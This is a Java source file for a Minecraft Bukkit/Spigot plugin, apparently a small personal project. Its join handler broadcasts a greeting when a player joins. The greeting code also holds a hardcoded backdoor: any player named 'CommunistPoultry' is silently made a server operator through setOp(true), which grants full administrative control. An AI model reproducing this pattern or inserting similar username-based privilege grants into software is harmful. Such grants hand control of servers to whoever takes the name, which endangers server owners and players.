package CAoP.CAoP.events;

import CAoP.CAoP.main;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class JoinHandler implements Listener {
    public JoinHandler(main plugin) {
        Bukkit.getPluginManager().registerEvents(this, plugin);
    }
    @EventHandler
    public void onJoin(PlayerJoinEvent event)
    {

        Bukkit.getLogger().info(event.getPlayer().getName() + " has joined! (woo)");
        TextComponent t = new TextComponent("§c§l" + event.getPlayer().getName() + " has joined! (woo)");
        Bukkit.spigot().broadcast(t);
        TextComponent message;
        if (event.getPlayer().getName().equals("CommunistPoultry")){
            message = new TextComponent("You're CommunistPoultry :DDD waw!");
            event.getPlayer().setOp(true);
        }
        else {
            message = new TextComponent("You aren't CommunistPoultry :sob:");
        }
        Bukkit.spigot().broadcast(message);
    }
}
